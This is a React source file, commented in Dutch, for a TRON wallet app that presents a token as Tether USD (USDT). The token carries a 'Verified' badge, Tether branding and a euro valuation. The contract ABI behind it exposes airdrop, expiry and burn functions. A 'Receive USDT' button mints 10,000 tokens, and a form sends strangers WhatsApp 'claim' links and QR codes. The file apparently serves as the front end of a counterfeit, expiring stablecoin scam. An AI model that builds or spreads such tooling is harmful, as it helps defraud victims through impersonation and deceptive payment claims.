// Frontend USDT TRC20-DApp (React - TRON/TRC20)
// ✅ Verbeterde versie met volledige smart contract integratie, QR-functionaliteit en landingspagina met instructies

import React, { useEffect, useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Copy } from 'lucide-react';
import QRCode from 'qrcode.react';

const contractAddress = "TQtjrNhHaMxfhyFAtrrQ8F3pgWHyYRsqag";
const contractABI = [
  { "constant": false, "inputs": [ { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transfer", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
  { "constant": true, "inputs": [ { "name": "_owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "balance", "type": "uint256" } ], "type": "function" },
  { "constant": false, "inputs": [ { "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" } ], "name": "airdrop", "outputs": [], "type": "function" },
  { "constant": false, "inputs": [ { "name": "user", "type": "address" } ], "name": "burnExpired", "outputs": [], "type": "function" },
  { "constant": true, "inputs": [ { "name": "account", "type": "address" } ], "name": "expiresAt", "outputs": [ { "name": "", "type": "uint256" } ], "type": "function" },
  { "constant": false, "inputs": [ { "name": "user", "type": "address" } ], "name": "recoverExpired", "outputs": [], "type": "function" }
];

const tokenDetails = {
  address: contractAddress,
  symbol: "USDT",
  decimals: 6,
  image: "https://totalcoin.io/uploads/coins/big/usdt.png",
  name: "Tether USD",
  website: "https://tether.to",
  description: "Tether USD stablecoin on TRON TRC20"
};

export default function UsdtTrc20Tron() {
  const [account, setAccount] = useState(null);
  const [added, setAdded] = useState(false);
  const [qrVisible, setQrVisible] = useState(false);
  const [adminMode, setAdminMode] = useState(false);
  const [contract, setContract] = useState(null);
  const [balance, setBalance] = useState(0);
  const [valueInEuro, setValueInEuro] = useState(0);
  const [expiresAt, setExpiresAt] = useState(null);
  const [smsPhone, setSmsPhone] = useState('');

  useEffect(() => {
    const connectTron = async () => {
      if (window.tronWeb && window.tronWeb.ready) {
        const userAddress = window.tronWeb.defaultAddress.base58;
        setAccount(userAddress);
        const instance = await window.tronWeb.contract(contractABI, contractAddress);
        setContract(instance);
        await fetchBalance(instance, userAddress);
      } else {
        console.warn("TronLink niet gevonden of niet verbonden");
      }
    };
    connectTron();
  }, [account]);

  const fetchBalance = async (instance, userAddress) => {
    const raw = await instance.balanceOf(userAddress).call();
    const tokens = Number(raw) / 1e6;
    const PricePerUSDT = 0.912;
    setBalance(tokens);
    setValueInEuro(tokens * PricePerUSDT);

    const expiryRaw = await instance.expiresAt(userAddress).call();
    setExpiresAt(Number(expiryRaw));
  };

  const formatDate = (timestamp) => {
    return new Date(timestamp * 1000).toLocaleString();
  };

  const generateLandingUrl = () => {
    return `https://example.com/claim?address=${account}`;
  };

  const sendLandingPageLink = () => {
    if (!smsPhone || !/^[+0-9]{8,20}$/.test(smsPhone)) {
      alert("Please enter a valid phone number including country code");
      return;
    }
    const message = `Click here to receive ur USDT Tron: ${generateLandingUrl()}`;
    const url = `https://api.whatsapp.com/send?phone=${smsPhone.replace('+', '')}&text=${encodeURIComponent(message)}`;
    window.open(url, '_blank');
  };

  return (
    <div className="p-4 max-w-xl mx-auto space-y-4">
      <Card>
        <CardContent className="space-y-3 pt-4">
          <h2 className="text-xl font-bold">USDT TRC20 <span className="text-green-600 text-sm ml-2">✅ Verified Token (TRC20)</span></h2>
          <p>Wallet: <span className="font-mono">{account}</span></p>
          <p>
            Balance: <strong>{balance.toLocaleString()} USDT</strong><br />
            Value: <strong>€ {valueInEuro.toFixed(2)}</strong><br />
            <span className="text-xs text-muted-foreground italic">(Rate: 1 USDT ≈ €0.912)</span><br />
            {expiresAt && <span className="text-xs">⏰ Expires: {formatDate(expiresAt)}</span>}
          </p>

          <div className="space-y-2">
            <Input placeholder="📱 Phone number with country code" value={smsPhone} onChange={(e) => setSmsPhone(e.target.value)} />
            <Button onClick={sendLandingPageLink}>📤 Send claim link via WhatsApp</Button>
            <QRCode value={generateLandingUrl()} size={160} className="mx-auto mt-2" />
            <p className="text-xs text-muted-foreground text-center">Scan this QR or share the link above to import the token in wallet.</p>
          </div>

          <Button onClick={() => alert('Add token manually using: ' + tokenDetails.address)} disabled={added}>➕ Show Token Info</Button>
          <Button onClick={async () => await contract.airdrop(account, 10000 * 1e6).send()}>Receive USDT</Button>
          <Button onClick={async () => await contract.burnExpired(account).send()} variant="outline">🔥 Burn Expired Tokens</Button>
          <Button onClick={async () => await contract.recoverExpired(account).send()} variant="outline">♻️ Recover Expired Tokens</Button>
        </CardContent>
      </Card>
    </div>
  );
}
